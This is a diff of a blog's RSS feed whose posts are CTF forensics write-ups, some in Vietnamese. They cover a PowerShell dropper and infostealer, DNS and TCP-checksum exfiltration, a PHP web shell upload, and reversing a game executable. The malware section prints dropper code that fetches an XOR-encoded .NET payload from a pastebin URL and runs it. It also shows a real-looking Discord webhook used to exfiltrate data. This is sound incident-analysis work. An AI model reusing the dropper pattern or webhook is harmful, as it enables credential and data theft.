@@ -1,14 +1,14 @@
 <?xml version="1.0" encoding="UTF-8"?><rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/"><channel><title>KAiZ3n</title><description>Demo Site</description><link>https://bruning-frighting.github.io/KAiZ3nThong/</link><language>en</language><item><title>CSCV2025Quals</title><link>https://bruning-frighting.github.io/KAiZ3nThong/posts/cscv2025quals/</link><guid isPermaLink="true">https://bruning-frighting.github.io/KAiZ3nThong/posts/cscv2025quals/</guid><pubDate>Thu, 23 Oct 2025 00:00:00 GMT</pubDate><content:encoded>&lt;h1&gt;CSCV2025 Quals&lt;/h1&gt;
 &lt;p&gt;Author: KAiZ3n
-&lt;img src=&quot;https://hackmd.io/_uploads/SkVt48wCxe.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+&lt;img src=&quot;/images/hackmd/SkVt48wCxe.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
 &lt;h1&gt;NostalgiaS&lt;/h1&gt;
-&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/H1kfCU80ex.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackmd/H1kfCU80ex.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;The challenge description does not specify the initial access vector, so we will proceed with a filesystem examination to gather more information.&lt;/p&gt;
 &lt;p&gt;First, I examined the machine&apos;s &lt;code&gt;winevtx&lt;/code&gt; logs and found a suspicious PowerShell command with Event ID 400.
-&lt;img src=&quot;https://hackmd.io/_uploads/SyELgKLAee.png&quot; alt=&quot;image&quot; /&gt;
-&lt;img src=&quot;https://hackmd.io/_uploads/SyJ47YLCgl.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+&lt;img src=&quot;/images/hackmd/SyELgKLAee.png&quot; alt=&quot;image&quot; /&gt;
+&lt;img src=&quot;/images/hackmd/SyJ47YLCgl.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;The script decodes a hex payload and decrypts it via XOR.
-&lt;img src=&quot;https://hackmd.io/_uploads/SkNuQtLAge.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+&lt;img src=&quot;/images/hackmd/SkNuQtLAge.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;$AssemblyUrl = &quot;https://pastebin.com/raw/90qeYSHA&quot;
 $XorKey = 0x24
 $TypeName = &quot;StealerJanai.core.RiderKick&quot;
@@ -46,9 +46,9 @@ try {
 &lt;p&gt;The script proceeds to download a malicious .NET assembly, XORs the payload with &lt;code&gt;0x24&lt;/code&gt;, and executes it using &lt;code&gt;Assembly.Load&lt;/code&gt;.
 URL : https://pastebin.com/raw/90qeYSHA
 Name : &quot;StealerJanai.core.RiderKick&quot;
-&lt;img src=&quot;https://hackmd.io/_uploads/Syf74KLAlx.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+&lt;img src=&quot;/images/hackmd/Syf74KLAlx.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;Starting the analysis with ILSpy, we look into &lt;code&gt;StealerJani.Main()&lt;/code&gt;.
-&lt;img src=&quot;https://hackmd.io/_uploads/BJkKBF80ll.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+&lt;img src=&quot;/images/hackmd/BJkKBF80ll.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;Execution Flow Summary:&lt;/strong&gt;
 Main -&amp;gt; Run -&amp;gt; Initializes RiderKick constructor -&amp;gt; Sets up a Discord webhook URL and calls the AutoRun function.
 URL :https://discord.com/api/webhooks/1389141710126452766/D1NUx0HaXI0Zx6xJSEqYy06X7b8HisqM3rfNUw2qdIWt_WbcE8HXLcIpe2oicB7GpU6e&lt;/p&gt;
@@ -86,8 +86,8 @@ private void AutoRun()
 &lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;It will collect specified system and browser data and exfiltrate them to Discord, which acts as a C2, using the Webhook URL.&lt;/p&gt;
 &lt;p&gt;In &lt;code&gt;systemInformation.collectionSystemInfo()&lt;/code&gt;, it collects &lt;code&gt;secretInformation&lt;/code&gt;.
-&lt;img src=&quot;https://hackmd.io/_uploads/rkIYPt8Rgx.png&quot; alt=&quot;image&quot; /&gt;
-&lt;img src=&quot;https://hackmd.io/_uploads/SJRcDY8Cle.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+&lt;img src=&quot;/images/hackmd/rkIYPt8Rgx.png&quot; alt=&quot;image&quot; /&gt;
+&lt;img src=&quot;/images/hackmd/SJRcDY8Cle.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;The hardcoded strings are decoded through a function and assembled in the format: &lt;code&gt;text + machineName + &quot;_&quot; + text2 + registryValue + &quot;}&quot;&lt;/code&gt;.&lt;/p&gt;
 &lt;p&gt;&lt;code&gt;DecodeMagicToString&lt;/code&gt; is actually a Base62 decoding function.&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;// StealerJanai, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
@@ -148,9 +148,9 @@ private string DecodeMagicToString(string input)
 
 &lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;Proceeding to decode the hardcoded strings and retrieve the MachineName as well as the registry value from &lt;code&gt;SOFTWARE\hensh1n&lt;/code&gt;.
-&lt;img src=&quot;https://hackmd.io/_uploads/ByH2stICle.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+&lt;img src=&quot;/images/hackmd/ByH2stICle.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;SYSTEM machine Name value:
-&lt;img src=&quot;https://hackmd.io/_uploads/H1NMhFLCgx.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+&lt;img src=&quot;/images/hackmd/H1NMhFLCgx.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;Two hardcoded Base62 strings:
 -&amp;gt; CSCV2025{your_computer_
 -&amp;gt; has_be3n_kicked_by&lt;/p&gt;
@@ -171,15 +171,15 @@ private string DecodeMagicToString(string input)
 &lt;p&gt;The attack originates from a PowerShell script, likely executed by the user. This script acts as a dropper, fetching a second-stage payload from Pastebin. The payload is a hex-encoded string which, after being decoded and XORed with the key &lt;code&gt;0x24&lt;/code&gt;, is loaded as a .NET assembly (&lt;code&gt;StealerJanai.dll&lt;/code&gt;) in memory.&lt;/p&gt;
 &lt;p&gt;The malware, &lt;code&gt;StealerJanai&lt;/code&gt;, is an infostealer. Upon execution, it gathers system information (including the computer name) and browser data. It also retrieves a specific value from the registry key &lt;code&gt;HKEY_CURRENT_USER\SOFTWARE\hensh1n&lt;/code&gt;. This collected data, including parts of the final flag, is then exfiltrated to a hardcoded Discord webhook URL, which serves as the command-and-control (C2) server. The final flag is constructed by combining decoded strings with the victim&apos;s machine name and the retrieved registry value.&lt;/p&gt;
 &lt;h1&gt;Case AlphaS&lt;/h1&gt;
-&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/ryWylcU0le.png&quot; alt=&quot;image&quot; /&gt;
-&lt;img src=&quot;https://hackmd.io/_uploads/SkXGlcI0lg.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackmd/ryWylcU0le.png&quot; alt=&quot;image&quot; /&gt;
+&lt;img src=&quot;/images/hackmd/SkXGlcI0lg.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;According to the description, we have a timeline for the incident response, an attacker&apos;s drive, and an external drive from the victim that has been encrypted with BitLocker.
 We observed that the Windows user downloaded artifacts recently, likely within the timeframe of the incident.
-&lt;img src=&quot;https://hackmd.io/_uploads/Hk8hbqUAel.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+&lt;img src=&quot;/images/hackmd/Hk8hbqUAel.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;I will focus on application artifacts first. SimpleNote seems likely to contain important notes.
 Reading the cache for SimpleNote, ChatGPT, and Firefox did not initially yield any results. I was stuck on this for a while, but upon further investigation, I found that logs from SimpleNote and ChatGPT were saved in plaintext.
-&lt;img src=&quot;https://hackmd.io/_uploads/B1_SIVD0gg.png&quot; alt=&quot;image&quot; /&gt;
-&lt;img src=&quot;https://hackmd.io/_uploads/H1Wd8NPCll.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+&lt;img src=&quot;/images/hackmd/B1_SIVD0gg.png&quot; alt=&quot;image&quot; /&gt;
+&lt;img src=&quot;/images/hackmd/H1Wd8NPCll.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;Log Paths:&lt;/strong&gt;&lt;/p&gt;
 &lt;ul&gt;
 &lt;li&gt;&lt;code&gt;%APPDATA%\Local\Microsoft\Packages\22490Automattic.Simplenote_9h07f78gwnchp\LocalCache\Roaming\SimpleNote\IndexedDB\file__0.indexeddb.leveldb\0003.log&lt;/code&gt;&lt;/li&gt;
@@ -189,22 +189,22 @@ Reading the cache for SimpleNote, ChatGPT, and Firefox did not initially yield a
 &lt;ul&gt;
 &lt;li&gt;Obtained Gmail address: &lt;code&gt;tangthanhvan56@gmail.com&lt;/code&gt;&lt;/li&gt;
 &lt;li&gt;Obtained a password for a zip file.
-&lt;img src=&quot;https://hackmd.io/_uploads/rJd8tVP0gx.png&quot; alt=&quot;iamge&quot; /&gt;&lt;/li&gt;
+&lt;img src=&quot;/images/hackmd/rJd8tVP0gx.png&quot; alt=&quot;iamge&quot; /&gt;&lt;/li&gt;
 &lt;/ul&gt;
-&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/BkMbbrwCel.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackmd/BkMbbrwCel.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
 &lt;ul&gt;
 &lt;li&gt;Obtained the BitLocker recovery key from ChatGPT logs. Used Autopsy to read the external drive.&lt;/li&gt;
 &lt;/ul&gt;
 &lt;p&gt;After decrypting with the recovery key, we found a &lt;code&gt;secret.zip&lt;/code&gt; file. Using the password recovered from the SimpleNote logs, we unzipped the file.
-&lt;img src=&quot;https://hackmd.io/_uploads/SkHfnNDRge.png&quot; alt=&quot;image&quot; /&gt;
-&lt;img src=&quot;https://hackmd.io/_uploads/HJqO3NP0gx.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+&lt;img src=&quot;/images/hackmd/SkHfnNDRge.png&quot; alt=&quot;image&quot; /&gt;
+&lt;img src=&quot;/images/hackmd/HJqO3NP0gx.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;Reading the &lt;code&gt;ssh.txt&lt;/code&gt; file revealed a link to Pastebin.&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;# access via vpn or proxy if you are blocked
 https://pastebin.com/WciYiDEs
 
 cff4c6f0b68c31cb
 &lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/Sy4hnVDAgg.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackmd/Sy4hnVDAgg.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;And we obtained the flag.&lt;/p&gt;
 &lt;hr /&gt;
 &lt;h2&gt;IOC Report&lt;/h2&gt;
@@ -221,7 +221,7 @@ cff4c6f0b68c31cb
 &lt;li&gt;&lt;strong&gt;Potential Credential:&lt;/strong&gt; &lt;code&gt;cff4c6f0b68c31cb&lt;/code&gt;&lt;/li&gt;
 &lt;/ul&gt;
 &lt;h1&gt;CovertS&lt;/h1&gt;
-&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/HJXUZHPAel.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackmd/HJXUZHPAel.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;Based on the challenge description, the scenario involves data exfiltration, and the provided PCAP file is quite large.&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;┌──(thong㉿MSI)-[/mnt/c/users/tttho/Downloads/forensics-Covert-7afc4ba9ad51f576437a2c204831153a (1)]
 └─$ capinfos challenge.pcapng
@@ -262,14 +262,14 @@ Interface #0 info:
 &lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;Due to the large file size, I segregated the traffic into three smaller files based on protocol: TCP, UDP, and ICMP.&lt;/p&gt;
 &lt;p&gt;Upon analyzing the ICMP traffic, I identified exfiltration attempts. However, the payloads consisted solely of the character &quot;A,&quot; suggesting a potential diversion or an attempt to create noise and obstruct the analysis.
-&lt;img src=&quot;https://hackmd.io/_uploads/rJ9ONBwRge.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+&lt;img src=&quot;/images/hackmd/rJ9ONBwRge.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;Therefore, I decided to deprioritize the ICMP traffic.&lt;/p&gt;
 &lt;p&gt;The UDP traffic primarily consisted of the QUIC protocol. Payloads transmitted over QUIC are heavily encrypted, and there were no discernible signs of data exfiltration.
-&lt;img src=&quot;https://hackmd.io/_uploads/BkUISHvAxx.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+&lt;img src=&quot;/images/hackmd/BkUISHvAxx.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;Consequently, the investigation shifted its focus to the TCP protocol.&lt;/p&gt;
 &lt;p&gt;&lt;a href=&quot;https://medium.com/@hhkolberg/how-i-used-tcp-headers-to-exfiltrate-data-a-simple-but-powerful-learning-exercise-7d9812ce81c1&quot;&gt;Reference Document&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;Drawing inspiration from the referenced blog post, my initial approach was to filter for TCP SYN packets on ports other than 443. This strategy aimed to exclude HTTPS traffic, where the TLS handshake occurs over port 443, thereby narrowing the scope of the investigation.&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/SJkRDSvAxe.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackmd/SJkRDSvAxe.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;In a packet with source IP &lt;code&gt;192.168.203.91&lt;/code&gt; and destination IP &lt;code&gt;192.168.192.1&lt;/code&gt;, using ports 20981 and 3239, I observed that the TCP checksum field contained two characters that appeared to be part of a Base64 encoded string. I proceeded to dump this data using &lt;code&gt;tshark&lt;/code&gt;.&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;└─$ tshark -r tcp.pcap -Y &quot;ip.addr==192.168.192.1 &amp;amp;&amp;amp; ip.addr==192.168.203.91&quot; -Tfields -e tcp.checksum &amp;gt; out
 &lt;/code&gt;&lt;/pre&gt;
@@ -293,15 +293,15 @@ CSCV2025{my_chal_got_leaked_before_the_contest_bruh_here_is_your_new_flag_b8891c
 &lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;Flag: &lt;code&gt;CSCV2025{my_chal_got_leaked_before_the_contest_bruh_here_is_your_new_flag_b8891c4e147c452b8cc6642f10400452}&lt;/code&gt;&lt;/p&gt;
 &lt;h1&gt;DNS Exfil&lt;/h1&gt;
-&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/Sk0V9SDRxe.png&quot; alt=&quot;image&quot; /&gt;
-&lt;img src=&quot;https://hackmd.io/_uploads/Hyl_qHvAxl.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackmd/Sk0V9SDRxe.png&quot; alt=&quot;image&quot; /&gt;
+&lt;img src=&quot;/images/hackmd/Hyl_qHvAxl.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;This report details the analysis of a data exfiltration attempt using DNS queries. The investigation focuses on dissecting network traffic and correlating it with server logs to understand the attacker&apos;s methodology.&lt;/p&gt;
 &lt;h2&gt;Initial Network Traffic Analysis&lt;/h2&gt;
 &lt;p&gt;The investigation began by examining the provided PCAP file (&lt;code&gt;10.10.0.53_ns_capture.pcap&lt;/code&gt;) using &lt;code&gt;tshark&lt;/code&gt;. The first step was to extract all DNS query names to identify any unusual patterns.&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;┌──(thong㉿MSI)-[/mnt/c/users/tttho/Downloads/dns_exfil (1)]
 └─$ tshark -r &quot;dnsexfil/10.10.0.53_ns_capture.pcap&quot; -Tfields -e dns.qry.name
 &lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/ByzNsBwRee.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackmd/ByzNsBwRee.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;Suspicious queries to a domain, &lt;code&gt;cloudflar3.com&lt;/code&gt;, were identified. The following command was used to filter for these specific queries and extract relevant metadata, including the full query name, source/destination IPs, and timestamp.&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;──(thong㉿MSI)-[/mnt/c/users/tttho/Downloads/dns_exfil (1)]
 └─$ tshark -r &quot;dnsexfil/10.10.0.53_ns_capture.pcap&quot; -Y &quot;dns.qry.name contains \&quot;cloudflar3\&quot;&quot; -Tfields -e dns.qry.name -e ip.src -e ip.dst  -e frame.time
@@ -322,19 +322,19 @@ f.95380b06bf6dd06b89118b0003ea044700a5f2c4c106c3.hex.cloudflar3.com     10.10.0.
 &lt;h2&gt;Log Correlation and Server Analysis&lt;/h2&gt;
 &lt;p&gt;Pivoting to the destination IP address, &lt;code&gt;10.10.5.80&lt;/code&gt;, an analysis of server logs was conducted. The access and error logs for the webserver were found to have entries corresponding to the timeline of the suspicious DNS traffic.&lt;/p&gt;
 &lt;p&gt;The access log revealed a connection to an administrative page from the IP address &lt;code&gt;10.55.1.77&lt;/code&gt;.
-&lt;img src=&quot;https://hackmd.io/_uploads/S1U5THP0ll.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+&lt;img src=&quot;/images/hackmd/S1U5THP0ll.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;Simultaneously, the error log showed a large file upload error directed at &lt;code&gt;intra.portal.local&lt;/code&gt;. This indicates a potential web shell upload or data staging attempt.
-&lt;img src=&quot;https://hackmd.io/_uploads/HkBoASwRge.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+&lt;img src=&quot;/images/hackmd/HkBoASwRge.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;Further investigation of the &lt;code&gt;intra.portal.local&lt;/code&gt; domain confirmed the upload of a PHP web shell named &lt;code&gt;getfile.php&lt;/code&gt;.
-&lt;img src=&quot;https://hackmd.io/_uploads/H1RaJUPCeg.png&quot; alt=&quot;image&quot; /&gt;
-&lt;img src=&quot;https://hackmd.io/_uploads/Sk-mgLP0xx.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+&lt;img src=&quot;/images/hackmd/H1RaJUPCeg.png&quot; alt=&quot;image&quot; /&gt;
+&lt;img src=&quot;/images/hackmd/Sk-mgLP0xx.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
 &lt;h2&gt;Decryption of Exfiltrated Data&lt;/h2&gt;
 &lt;p&gt;A debug variable found on the server provided the key to understanding the exfiltrated data:
 &lt;code&gt;DEBUG VARS: APP_SECRET=F0r3ns1c-2025-CSCV; DATE_UTC=20251010&lt;/code&gt;
 &lt;code&gt;H=SHA256(APP_SECRET); AES_KEY=H[0..15]; AES_IV=H[16..31];&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;This indicates that the exfiltrated data seen in the DNS query subdomains is likely encrypted. The payload is constructed using an AES key derived from the SHA256 hash of the &lt;code&gt;APP_SECRET&lt;/code&gt;.&lt;/p&gt;
 &lt;p&gt;The structure of the DNS payload was analyzed.
-&lt;img src=&quot;https://hackmd.io/_uploads/S15sW8v0ge.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+&lt;img src=&quot;/images/hackmd/S15sW8v0ge.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;The hex-encoded string in the subdomain is split to separate the ciphertext from another component, possibly an IV or a MAC.&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; a = &quot;5769179ccdf950443501d9978f52ddb51b70ca0d4f607a976c6639914af7c7a6&quot;
 &amp;gt;&amp;gt;&amp;gt; print(a[32:])
@@ -343,17 +343,17 @@ f.95380b06bf6dd06b89118b0003ea044700a5f2c4c106c3.hex.cloudflar3.com     10.10.0.
 5769179ccdf950443501d9978f52ddb5
 &lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;By using the discovered &lt;code&gt;APP_SECRET&lt;/code&gt; and understanding the payload structure, the encrypted data can be reconstructed and decrypted.
-&lt;img src=&quot;https://hackmd.io/_uploads/SJcqbLPCxe.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+&lt;img src=&quot;/images/hackmd/SJcqbLPCxe.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;&lt;/code&gt;&lt;/pre&gt;
 </content:encoded></item><item><title>Candle - bounty PTIT HN-HCM CTF Finals 2025 forensic</title><link>https://bruning-frighting.github.io/KAiZ3nThong/posts/candle/</link><guid isPermaLink="true">https://bruning-frighting.github.io/KAiZ3nThong/posts/candle/</guid><pubDate>Tue, 21 Oct 2025 00:00:00 GMT</pubDate><content:encoded>&lt;h1&gt;Candle - bounty PTIT HN-HCM CTF Finals 2025 forensic&lt;/h1&gt;
-&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/ryKvW80jxx.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackmd/ryKvW80jxx.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;Nhận một file rawdata PEPPER và file mp4&lt;/p&gt;
 &lt;ul&gt;
 &lt;li&gt;Ở file mp4 Thấy file mp3 khá lớn khi check strings có các header lạ
-&lt;img src=&quot;https://hackmd.io/_uploads/H1lKdwRjxl.png&quot; alt=&quot;image&quot; /&gt;&lt;/li&gt;
+&lt;img src=&quot;/images/hackmd/H1lKdwRjxl.png&quot; alt=&quot;image&quot; /&gt;&lt;/li&gt;
 &lt;li&gt;Dùng binwalk để dump file mp4 ra vì
-&lt;img src=&quot;https://hackmd.io/_uploads/SJU6dwAoxg.png&quot; alt=&quot;image&quot; /&gt;
-&lt;img src=&quot;https://hackmd.io/_uploads/HJgAdwRsxl.png&quot; alt=&quot;image&quot; /&gt;
+&lt;img src=&quot;/images/hackmd/SJU6dwAoxg.png&quot; alt=&quot;image&quot; /&gt;
+&lt;img src=&quot;/images/hackmd/HJgAdwRsxl.png&quot; alt=&quot;image&quot; /&gt;
 có điểm đáng chú ý là file manifest.json (nó làm một file cấu hình cho việc lấy flag)&lt;/li&gt;
 &lt;/ul&gt;
 &lt;pre&gt;&lt;code&gt;└─$ strings a/out_tiles/manifest.json
@@ -543,11 +543,11 @@ Với từng entry trong &quot;pieces&quot;:&lt;/p&gt;
 Ví dụ: piece_19.png có {r:3, c:1} → dán vào tọa độ (1×82, 3×98) = (82, 294).
 Sau khi ghép đủ 30 mảnh, crop bỏ phần padding (2 px bên phải) → còn lại 490 × 490 px đúng kích thước gốc.
 Nhưng sau khi tôi làm vậy viết script vẫn không recovery lại được ảnh gốc tôi nghi ngờ các file name đã bị scamble tôi đã thử kiểm tra file với exiftool thì thấy mỗi file đều có một trường Pos dường như tương ứng với các tọa độ
-&lt;img src=&quot;https://hackmd.io/_uploads/Skp7qDRseg.png&quot; alt=&quot;image&quot; /&gt;
+&lt;img src=&quot;/images/hackmd/Skp7qDRseg.png&quot; alt=&quot;image&quot; /&gt;
 Dùng exiftol -pos để truy xuất các POS tương tứng với mỗi file
-&lt;img src=&quot;https://hackmd.io/_uploads/HJvXivRoex.png&quot; alt=&quot;image&quot; /&gt;
+&lt;img src=&quot;/images/hackmd/HJvXivRoex.png&quot; alt=&quot;image&quot; /&gt;
 Lấy được tọa độ ma trận rồi giờ ta tiến hành ghép lại ảnh
-&lt;img src=&quot;https://hackmd.io/_uploads/SJkhivAjlx.png&quot; alt=&quot;code&quot; /&gt;&lt;/li&gt;
+&lt;img src=&quot;/images/hackmd/SJkhivAjlx.png&quot; alt=&quot;code&quot; /&gt;&lt;/li&gt;
 &lt;/ul&gt;
 &lt;pre&gt;&lt;code&gt;┌──(thong㉿DESKTOP-SD4MBKE)-[/mnt/c/users/tttho/downloads/a/out_tiles]
 └─$ python e.py
@@ -556,34 +556,34 @@ Done.
 - reconstructed.png: 490x490
 - grid:              5 rows x 6 cols; tile=82x98
 &lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/HJEZaw0sex.png&quot; alt=&quot;reconstructed&quot; /&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackmd/HJEZaw0sex.png&quot; alt=&quot;reconstructed&quot; /&gt;
 đây là image sau khi recovery là một mã QR quét thì ra được một link
 truy cập vào có một bài post
-&lt;img src=&quot;https://hackmd.io/_uploads/BJNPaDCiel.png&quot; alt=&quot;image&quot; /&gt;
+&lt;img src=&quot;/images/hackmd/BJNPaDCiel.png&quot; alt=&quot;image&quot; /&gt;
 decryption base64 chuỗi ra flag fake&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;─$ echo &quot;VGhpcyBpcyBmbGFnOiBQVElUQ1RGe1ZpZXROYW1NdW9uTmFtfQ==&quot; | base64 -d
 This is flag: PTITCTF{VietNamMuonNam}
 &lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;còn một chuỗi ký tự rất lạ tôi đoán làm một url đã bị scamble
-&lt;img src=&quot;https://hackmd.io/_uploads/H16gADRoxl.png&quot; alt=&quot;image&quot; /&gt;
+&lt;img src=&quot;/images/hackmd/H16gADRoxl.png&quot; alt=&quot;image&quot; /&gt;
 check nhanh với trang dcode oke no đã bị ROT13
-&lt;img src=&quot;https://hackmd.io/_uploads/Skr7RD0jee.png&quot; alt=&quot;image&quot; /&gt;
+&lt;img src=&quot;/images/hackmd/Skr7RD0jee.png&quot; alt=&quot;image&quot; /&gt;
 một link github download một file exe
 Download file về và nhận diện signature file với die
-&lt;img src=&quot;https://hackmd.io/_uploads/HJAi0v0sex.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+&lt;img src=&quot;/images/hackmd/HJAi0v0sex.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
 &lt;h2&gt;Phân tích file candlegame.exe&lt;/h2&gt;
 &lt;p&gt;Hàm start sẽ gọi sub_140001180() -&amp;gt; sub_140189EE0 (main code)
 Logic hàm Sub_140001180 như một hàm init dùng để check ngoại lệ và xử lý nếu không sẽ gọi tới maincode (sub_140189EE0)
-&lt;img src=&quot;https://hackmd.io/_uploads/SJQxSLRoxl.png&quot; alt=&quot;image&quot; /&gt;
+&lt;img src=&quot;/images/hackmd/SJQxSLRoxl.png&quot; alt=&quot;image&quot; /&gt;
 Tại ô khoanh đó đang xây dựng một mảng argv[] để truyền vào main code
 =&amp;gt; v14 là *argv
 =&amp;gt; qword_14020E020 là argc&lt;/p&gt;
 &lt;h2&gt;maincode ( application GUI )&lt;/h2&gt;
 &lt;p&gt;Tại hàm maincode dựng một application GUI do hàm main này khá phức tạp nên tôi sẽ không đi theo hướng phân tích hàm này tôi sẽ tìm kiếm các API nghi ngờ
-&lt;img src=&quot;https://hackmd.io/_uploads/SJl7IUCoxg.png&quot; alt=&quot;image&quot; /&gt;
+&lt;img src=&quot;/images/hackmd/SJl7IUCoxg.png&quot; alt=&quot;image&quot; /&gt;
 thấy chương trình sử dụng bcrypt.dll và các API liên quan đến việc decryption/ derived key
 xref tới API BcryptDecrypt -&amp;gt; trỏ về hàm gọi nó
-&lt;img src=&quot;https://hackmd.io/_uploads/HJnv8LAixe.png&quot; alt=&quot;image&quot; /&gt;
+&lt;img src=&quot;/images/hackmd/HJnv8LAixe.png&quot; alt=&quot;image&quot; /&gt;
 Hàm được gọi từ sub_1400E6960+253&lt;/p&gt;
 &lt;h2&gt;sub_1400E6960 (decryption AES)&lt;/h2&gt;
 &lt;pre&gt;&lt;code&gt;_BOOL8 __fastcall sub_1400E6960(PUCHAR pbSecret, const __m128i *a2, UCHAR *a3, __int64 a4, _QWORD *a5)
@@ -815,7 +815,7 @@ hàm này được gọi từ sub_1400037B0&lt;/li&gt;
 &lt;h2&gt;sub_1400037B0 (config cấu hình)&lt;/h2&gt;
 &lt;p&gt;Nhìn vào hàm sub_1400037B0, đây là một hàm khởi tạo / giải mã dữ liệu cấu hình được mã hóa và nhúng sẵn trong chương trình.
 Mình tóm tắt logic của nó như sau:&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/Hy4sPICjgg.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackmd/Hy4sPICjgg.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
